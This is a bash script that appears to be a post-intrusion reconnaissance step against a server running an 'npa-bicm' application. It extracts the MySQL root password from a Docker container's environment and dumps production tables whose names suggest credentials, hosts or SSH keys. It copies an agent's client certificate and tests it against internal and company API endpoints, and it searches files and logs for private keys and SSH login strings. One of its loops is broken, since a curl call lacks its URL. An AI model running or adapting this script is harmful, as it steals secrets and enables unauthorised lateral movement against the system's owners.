#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START7 $(date -u +%FT%TZ)"
log "### DBPW"; DBPW=$(docker inspect npa-bicm-mysql --format '{{range .Config.Env}}{{println .}}{{end}}' | sed -n 's/^MYSQL_ROOT_PASSWORD=//p'); echo "len=${#DBPW}"
log "### TABLES"; docker exec npa-bicm-mysql mysql -uroot -p"$DBPW" -N -e "show tables from npa_prod;" 2>/dev/null | tr '\n' ' '; echo
log "### DUMP"
for t in $(docker exec npa-bicm-mysql mysql -uroot -p"$DBPW" -N -e "show tables from npa_prod;" 2>/dev/null); do
  case "$t" in
    *node*|*host*|*server*|*ssh*|*key*|*pass*|*cred*|*cmd*|*script*|*instance*|*device*|*gpu*|*cluster*|*task*|*job*|*machine*|*env*|*config*)
      log "===== TABLE $t"; docker exec npa-bicm-mysql mysql -uroot -p"$DBPW" -e "select * from npa_prod.\`$t\` limit 6\G" 2>/dev/null | head -60;;
  esac
done
log "### CERT-PEM"; cat /opt/bcm-agent/var/lib/bcm-agent/cert.pem 2>/dev/null | grep -c "BEGIN"; grep -E "^-----" /opt/bcm-agent/var/lib/bcm-agent/cert.pem 2>/dev/null
cp /opt/bcm-agent/var/lib/bcm-agent/cert.pem /tmp/bcm.pem 2>/dev/null
log "### CERT-8081"; timeout 8 curl -sk -m 6 --cert /tmp/bcm.pem "http://192.168.0.20:8081/" -o /tmp/c1 -w "http8081=%{http_code} "; head -c 150 /tmp/c1; echo
timeout 8 curl -sk -m 6 --cert /tmp/bcm.pem "https://192.168.0.20:8081/" -o /tmp/c2 -w "tls8081=%{http_code} "; head -c 150 /tmp/c2; echo
log "### BCM-API-9038"
timeout 8 getent hosts bcm.cnsy.syhgcloud.com
for u in "https://bcm.cnsy.syhgcloud.com:9038/" "http://bcm.cnsy.syhgcloud.com:9038/"; do
  log "-- $u"; timeout 8 curl -sk -m 6 --cert /tmp/bcm.pem -o /tmp/c3 -w "http=%{http_code} "; head -c 150 /tmp/c3; echo
done
log "### NPA-FILES"
timeout 40 grep -rIl -E 'ssh |pkey|BEGIN OPENSSH|PRIVATE KEY|sshpass|paramiko' /data/npa-bicm /ssd/vendors/QD_GLAD/npa_bicm 2>/dev/null | head -15
log "### NPA-LOGS"
ls -la /ssd/vendors/QD_GLAD/npa_bicm/npa_server/logs/server 2>/dev/null | tail -5
timeout 20 grep -rhoE 'ssh [a-z]+@[0-9.]+[^"<]{0,80}' /ssd/vendors/QD_GLAD/npa_bicm/npa_server/logs 2>/dev/null | sort -u | head -15
log "### DONE7 $(date -u +%FT%TZ)"
